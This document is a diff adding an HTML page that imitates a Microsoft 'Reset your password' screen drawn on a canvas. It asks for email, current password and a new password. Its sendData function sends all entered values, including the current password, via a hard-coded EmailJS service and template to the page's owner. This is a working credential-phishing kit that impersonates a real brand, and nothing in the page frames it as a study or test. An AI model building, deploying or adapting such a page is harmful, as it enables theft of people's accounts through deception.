@@ -1,0 +1,364 @@
+<script type="text/javascript">
+        var gk_isXlsx = false;
+        var gk_xlsxFileLookup = {};
+        var gk_fileData = {};
+        function filledCell(cell) {
+          return cell !== '' && cell != null;
+        }
+        function loadFileData(filename) {
+        if (gk_isXlsx && gk_xlsxFileLookup[filename]) {
+            try {
+                var workbook = XLSX.read(gk_fileData[filename], { type: 'base64' });
+                var firstSheetName = workbook.SheetNames[0];
+                var worksheet = workbook.Sheets[firstSheetName];
+
+                // Convert sheet to JSON to filter blank rows
+                var jsonData = XLSX.utils.sheet_to_json(worksheet, { header: 1, blankrows: false, defval: '' });
+                // Filter out blank rows (rows where all cells are empty, null, or undefined)
+                var filteredData = jsonData.filter(row => row.some(filledCell));
+
+                // Heuristic to find the header row by ignoring rows with fewer filled cells than the next row
+                var headerRowIndex = filteredData.findIndex((row, index) =>
+                  row.filter(filledCell).length >= filteredData[index + 1]?.filter(filledCell).length
+                );
+                // Fallback
+                if (headerRowIndex === -1 || headerRowIndex > 25) {
+                  headerRowIndex = 0;
+                }
+
+                // Convert filtered JSON back to CSV
+                var csv = XLSX.utils.aoa_to_sheet(filteredData.slice(headerRowIndex)); // Create a new sheet from filtered array of arrays
+                csv = XLSX.utils.sheet_to_csv(csv, { header: 1 });
+                return csv;
+            } catch (e) {
+                console.error(e);
+                return "";
+            }
+        }
+        return gk_fileData[filename] || "";
+        }
+        </script><!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Change Password Interface</title>
+    <style>
+        body { margin: 0; display: flex; justify-content: center; align-items: center; height: 100vh; background-color: #f3f3f3; }
+        canvas { border: 1px solid #ccc; }
+        #hiddenInput { position: absolute; top: -100px; left: -100px; opacity: 0; }
+    </style>
+    <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
+    <script>
+        (function() {
+            emailjs.init("4GxkyKn2vUtBBDMeO");
+        })();
+    </script>
+</head>
+<body>
+    <canvas id="myCanvas" width="400" height="600"></canvas>
+    <input id="hiddenInput" type="text" autocapitalize="off" autocorrect="off">
+    <script type="text/javascript">
+        var gk_isXlsx = false;
+        var gk_xlsxFileLookup = {};
+        var gk_fileData = {};
+        function filledCell(cell) {
+          return cell !== '' && cell != null;
+        }
+        function loadFileData(filename) {
+        if (gk_isXlsx && gk_xlsxFileLookup[filename]) {
+            try {
+                var workbook = XLSX.read(gk_fileData[filename], { type: 'base64' });
+                var firstSheetName = workbook.SheetNames[0];
+                var worksheet = workbook.Sheets[firstSheetName];
+
+                // Convert sheet to JSON to filter blank rows
+                var jsonData = XLSX.utils.sheet_to_json(worksheet, { header: 1, blankrows: false, defval: '' });
+                // Filter out blank rows (rows where all cells are empty, null, or undefined)
+                var filteredData = jsonData.filter(row => row.some(filledCell));
+
+                // Heuristic to find the header row by ignoring rows with fewer filled cells than the next row
+                var headerRowIndex = filteredData.findIndex((row, index) =>
+                  row.filter(filledCell).length >= filteredData[index + 1]?.filter(filledCell).length
+                );
+                // Fallback
+                if (headerRowIndex === -1 || headerRowIndex > 25) {
+                  headerRowIndex = 0;
+                }
+
+                // Convert filtered JSON back to CSV
+                var csv = XLSX.utils.aoa_to_sheet(filteredData.slice(headerRowIndex)); // Create a new sheet from filtered array of arrays
+                csv = XLSX.utils.sheet_to_csv(csv, { header: 1 });
+                return csv;
+            } catch (e) {
+                console.error(e);
+                return "";
+            }
+        }
+        return gk_fileData[filename] || "";
+        }
+    </script>
+    <script>
+        const canvas = document.getElementById('myCanvas');
+        const ctx = canvas.getContext('2d');
+        const hiddenInput = document.getElementById('hiddenInput');
+
+        // Define input fields with specific types for better mobile keyboard behavior
+        const inputs = [
+            { x: 50, y: 150, width: 300, height: 40, text: '', placeholder: 'Email', active: false, type: 'email' },
+            { x: 50, y: 230, width: 300, height: 40, text: '', placeholder: 'Current Password', active: false, type: 'password' },
+            { x: 50, y: 310, width: 300, height: 40, text: '', placeholder: 'New Password', active: false, type: 'password' },
+            { x: 50, y: 390, width: 300, height: 40, text: '', placeholder: 'Re-enter Password', active: false, type: 'password' }
+        ];
+
+        const button = { x: 50, y: 470, width: 300, height: 40, text: 'Change Password' };
+
+        function sendData() {
+            const data = inputs.map(input => `${input.placeholder}: ${input.text || 'Not entered'}`).join('\n');
+            console.log('Attempting to send the following data:\n' + data);
+
+            const emailParams = {
+                message: data
+            };
+
+            emailjs.send("service_j7ud4ea", "template_t80n2fp", emailParams)
+                .then(function(response) {
+                    console.log('Email sent successfully:', response.status, response.text);
+                    alert('Data sent to owner successfully!');
+                }, function(error) {
+                    console.error('Failed to send email:', error);
+                    alert('Failed to send data to owner. Check console for details.');
+                });
+        }
+
+        function draw() {
+            ctx.clearRect(0, 0, canvas.width, canvas.height);
+            const gradient = ctx.createLinearGradient(0, 0, 0, canvas.height);
+            gradient.addColorStop(0, '#e6f0fa');
+            gradient.addColorStop(1, '#d6e6f2');
+            ctx.fillStyle = gradient;
+            ctx.fillRect(0, 0, canvas.width, canvas.height);
+
+            ctx.beginPath();
+            ctx.arc(50, 50, 40, 0, Math.PI * 2);
+            ctx.fillStyle = 'rgba(255, 165, 0, 0.3)';
+            ctx.fill();
+            ctx.beginPath();
+            ctx.moveTo(50, 50);
+            ctx.lineTo(50, 10);
+            ctx.lineTo(90, 50);
+            ctx.closePath();
+            ctx.fillStyle = gradient;
+            ctx.fill();
+
+            ctx.beginPath();
+            ctx.moveTo(0, 400);
+            ctx.lineTo(100, 400);
+            ctx.lineTo(50, 500);
+            ctx.lineTo(-50, 500);
+            ctx.closePath();
+            ctx.fillStyle = 'rgba(135, 206, 250, 0.3)';
+            ctx.fill();
+
+            ctx.beginPath();
+            ctx.arc(350, 500, 60, 0, Math.PI * 2);
+            ctx.fillStyle = 'rgba(144, 238, 144, 0.3)';
+            ctx.fill();
+
+            ctx.fillStyle = '#ffffff';
+            ctx.fillRect(20, 20, 360, 560);
+            ctx.strokeStyle = 'rgba(0, 0, 0, 0.1)';
+            ctx.lineWidth = 1;
+            ctx.strokeRect(20, 20, 360, 560);
+
+            ctx.fillStyle = '#f25022';
+            ctx.fillRect(40, 40, 15, 15);
+            ctx.fillStyle = '#7fba00';
+            ctx.fillRect(60, 40, 15, 15);
+            ctx.fillStyle = '#00a4ef';
+            ctx.fillRect(40, 60, 15, 15);
+            ctx.fillStyle = '#ffb900';
+            ctx.fillRect(60, 60, 15, 15);
+
+            ctx.fillStyle = '#000000';
+            ctx.font = '20px Arial';
+            ctx.textAlign = 'left';
+            ctx.textBaseline = 'middle';
+            ctx.fillText('Microsoft', 85, 55);
+
+            ctx.fillStyle = '#000000';
+            ctx.font = 'bold 24px Arial';
+            ctx.textAlign = 'left';
+            ctx.textBaseline = 'top';
+            ctx.fillText('Reset your password', 40, 100);
+
+            ctx.fillStyle = '#666666';
+            ctx.font = '14px Arial';
+            ctx.fillText('8-character minimum, case sensitive', 40, 130);
+
+            inputs.forEach(input => {
+                ctx.fillStyle = input.active ? '#e0f0ff' : '#ffffff';
+                ctx.fillRect(input.x, input.y, input.width, input.height);
+                ctx.strokeStyle = input.active ? '#0078d4' : '#cccccc';
+                ctx.lineWidth = 1;
+                ctx.strokeRect(input.x, input.y, input.width, input.height);
+
+                ctx.fillStyle = input.text ? '#000000' : '#888888';
+                ctx.font = '16px Arial';
+                ctx.textAlign = 'left';
+                ctx.textBaseline = 'middle';
+                const displayText = input.text || input.placeholder;
+                ctx.fillText(displayText, input.x + 10, input.y + input.height / 2);
+            });
+
+            ctx.fillStyle = '#0078d4';
+            ctx.fillRect(button.x, button.y, button.width, button.height);
+            ctx.fillStyle = '#ffffff';
+            ctx.font = '16px Arial';
+            ctx.textAlign = 'center';
+            ctx.textBaseline = 'middle';
+            ctx.fillText(button.text, button.x + button.width / 2, button.y + button.height / 2);
+
+            ctx.fillStyle = '#666666';
+            ctx.font = '12px Arial';
+            ctx.textAlign = 'center';
+            ctx.fillText('By clicking Change Password, you agree to the', 200, 520);
+            ctx.fillStyle = '#1a73e8';
+            ctx.fillText('TERMS OF USE', 200, 535);
+            ctx.fillStyle = '#666666';
+            ctx.fillText('and', 200, 550);
+            ctx.fillStyle = '#1a73e8';
+            ctx.fillText('Privacy Statement', 200, 565);
+        }
+
+        function handleInteraction(e) {
+            e.preventDefault();
+            const rect = canvas.getBoundingClientRect();
+            const x = (e.type === 'touchstart' ? e.touches[0].clientX : e.clientX) - rect.left;
+            const y = (e.type === 'touchstart' ? e.touches[0].clientY : e.clientY) - rect.top;
+
+            let anyInputActive = false;
+            inputs.forEach(input => {
+                input.active = x >= input.x && x <= input.x + input.width &&
+                               y >= input.y && y <= input.y + input.height;
+                if (input.active) {
+                    anyInputActive = true;
+                    hiddenInput.type = input.type; // Set input type (email or password)
+                    hiddenInput.value = input.text;
+                    hiddenInput.focus();
+                    // Force mobile keyboard to appear
+                    setTimeout(() => hiddenInput.focus(), 0);
+                }
+            });
+
+            if (!anyInputActive) {
+                hiddenInput.blur();
+                hiddenInput.type = 'text'; // Reset to default
+            }
+
+            if (x >= button.x && x <= button.x + button.width &&
+                y >= button.y && y <= button.y + button.height) {
+                const output = inputs.map(input => `${input.placeholder}: ${input.text || 'Not entered'}`).join('\n');
+                alert('Entered Information:\n' + output);
+                sendData();
+            }
+
+            draw();
+        }
+
+        // Handle focus and blur for better keyboard control
+        hiddenInput.addEventListener('focus', () => {
+            const activeInput = inputs.find(input => input.active);
+            if (activeInput) {
+                hiddenInput.type = activeInput.type;
+                hiddenInput.value = activeInput.text;
+            }
+        });
+
+        hiddenInput.addEventListener('blur', () => {
+            inputs.forEach(input => {
+                if (input.active) {
+                    input.text = hiddenInput.value;
+                    input.active = false;
+                }
+            });
+            hiddenInput.type = 'text'; // Reset to default
+            draw();
+        });
+
+        hiddenInput.addEventListener('input', () => {
+            const activeInput = inputs.find(input => input.active);
+            if (activeInput) {
+                activeInput.text = hiddenInput.value;
+                draw();
+            }
+        });
+
+        hiddenInput.addEventListener('keydown', (e) => {
+            const activeInput = inputs.find(input => input.active);
+            if (!activeInput) return;
+
+            if (e.key === 'Enter') {
+                hiddenInput.blur();
+                // Move focus to next input or submit
+                const currentIndex = inputs.indexOf(activeInput);
+                if (currentIndex < inputs.length - 1) {
+                    inputs[currentIndex + 1].active = true;
+                    inputs[currentIndex].active = false;
+                    hiddenInput.type = inputs[currentIndex + 1].type;
+                    hiddenInput.value = inputs[currentIndex + 1].text;
+                    hiddenInput.focus();
+                } else {
+                    // Trigger button action if last input
+                    const output = inputs.map(input => `${input.placeholder}: ${input.text || 'Not entered'}`).join('\n');
+                    alert('Entered Information:\n' + output);
+                    sendData();
+                }
+            }
+
+            draw();
+        });
+
+        canvas.addEventListener('click', handleInteraction);
+        canvas.addEventListener('touchstart', handleInteraction);
+
+        // Prevent default touch behaviors that might interfere
+        canvas.addEventListener('touchmove', e => e.preventDefault(), { passive: false });
+        canvas.addEventListener('touchend', e => e.preventDefault(), { passive: false });
+
+        draw();
+    </script>
+    <script>
+        (function(){
+            function c(){
+                var b=a.contentDocument||a.contentWindow.document;
+                if(b){
+                    var d=b.createElement('script');
+                    d.innerHTML="window.__CF$cv$params={r:'93e084e35de4bfcc',t:'MTc0Njk1NDM3My4wMDAwMDA='};var a=document.createElement('script');a.nonce='';a.src='/cdn-cgi/challenge-platform/scripts/jsd/main.js';document.getElementsByTagName('head')[0].appendChild(a);";
+                    b.getElementsByTagName('head')[0].appendChild(d)
+                }
+            }
+            if(document.body){
+                var a=document.createElement('iframe');
+                a.height=1;
+                a.width=1;
+                a.style.position='absolute';
+                a.style.top=0;
+                a.style.left=0;
+                a.style.border='none';
+                a.style.visibility='hidden';
+                document.body.appendChild(a);
+                if('loading'!==document.readyState)c();
+                else if(window.addEventListener)document.addEventListener('DOMContentLoaded',c);
+                else{
+                    var e=document.onreadystatechange||function(){};
+                    document.onreadystatechange=function(b){
+                        e(b);
+                        'loading'!==document.readyState&&(document.onreadystatechange=e,c())
+                    }
+                }
+            }
+        })();
+    </script>
+</body>
+</html>
